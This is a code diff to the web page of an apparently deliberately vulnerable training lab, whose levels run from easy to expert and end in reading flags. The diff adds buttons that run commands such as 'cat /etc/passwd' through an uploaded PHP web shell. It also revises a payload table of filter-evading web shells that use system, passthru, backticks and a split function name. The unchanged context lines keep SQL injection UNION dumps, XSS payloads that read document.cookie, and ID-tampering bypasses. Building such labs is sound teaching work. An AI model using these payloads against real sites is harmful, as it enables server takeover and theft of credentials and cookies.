@@ -132,6 +132,14 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
     <button type="button" class="ghost" onclick="fill('in_up','pl_up')">use this ▶</button></details>
   <form method="get" action="uploads/shell.php" target="r_upc" onsubmit="show('r_upc')">
     <input type="text" id="in_up" name="cmd" placeholder="command… (e.g. id)"><button>Run ▶</button></form>
+  <div class="muted" style="margin-top:4px">quick commands:
+    <button type="button" class="ghost" onclick="setCmd('id')">id</button>
+    <button type="button" class="ghost" onclick="setCmd('whoami')">whoami</button>
+    <button type="button" class="ghost" onclick="setCmd('uname -a')">uname -a</button>
+    <button type="button" class="ghost" onclick="setCmd('cat /etc/passwd')">/etc/passwd (users)</button>
+    <button type="button" class="ghost" onclick="setCmd('ls -la ..')">ls -la ..</button>
+    <button type="button" class="ghost" onclick="setCmd('cat ../private/upload_flag.txt')">read flag</button>
+  </div>
   <iframe name="r_upc" id="r_upc" class="res"></iframe></div>
 
 <!-- Info disclosure -->
@@ -154,6 +162,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 <script>
 function fill(inputId, plId){ var i=document.getElementById(inputId); i.value=document.getElementById(plId).textContent; i.dispatchEvent(new Event('input')); }
 function show(frameId){ document.getElementById(frameId).style.display='block'; }
+function setCmd(c){ var i=document.getElementById('in_up'); i.value=c; i.dispatchEvent(new Event('input')); }
 const PAYLOADS = {
  q:{
   easy:{p:"' UNION SELECT username,password,role FROM users-- -", n:"Easy — raw. Classic UNION dump."},
@@ -180,7 +189,7 @@ PAYLOADS.q.hard.x='"><svg onload=alert(1)>';
 PAYLOADS.q.expert.x='"><svg><animate onbegin=alert(1) attributeName=x dur=1s>';
 PAYLOADS.gb={easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw render."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — '<script' stripped once → <img onerror>."},hard:{p:"<svg onload=alert(document.cookie)>",n:"Hard — onerror also stripped → <svg onload>."},expert:{p:"<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>",n:"Expert — onload also stripped → <svg><animate onbegin>."}};
 PAYLOADS.id={easy:{p:"1",n:"Easy — raw id, just change it."},medium:{p:"MQ==",n:"Medium — id is base64-encoded. MQ== = base64 of 1."},hard:{p:"c4ca4238a0b923820dcc509a6f75849b",n:"Hard — id is md5(real id). This string is md5 of 1."},expert:{p:"(id ignored — set cookie uid=1)",n:"Expert — the ?id is ignored; the app trusts a uid cookie. DevTools → Application → Cookies → add uid=1, then Run."}};
-PAYLOADS.up={easy:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Easy — no checks."},medium:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Medium — content-type must be image/* (sent as image/gif for you)."},hard:{p:"GIF89a<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Hard — content must start with GIF89a magic bytes (prefixed)."},expert:{p:"GIF89a<\x3Fphp passthru($_GET['cmd']); ?\x3E",n:"Expert — the word 'system' is blocked → passthru()."}};
+PAYLOADS.up={easy:{p:"<\x3Fphp system($_GET['cmd']); ?\x3E",n:"Easy — no content checks."},medium:{p:"<\x3Fphp passthru($_GET['cmd']); ?\x3E",n:"Medium — 'system' blocked in content -> passthru()."},hard:{p:"<\x3Fphp echo `$_GET[cmd]`; ?\x3E",n:"Hard — exec-family blocked -> backticks."},expert:{p:"<\x3Fphp $f='sy'.'stem'; $f($_GET['cmd']); ?\x3E",n:"Expert — backticks blocked -> split the name (sy.stem -> system)."}};
 var _ready=false;
 function setLvl(card,lvl){
   var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
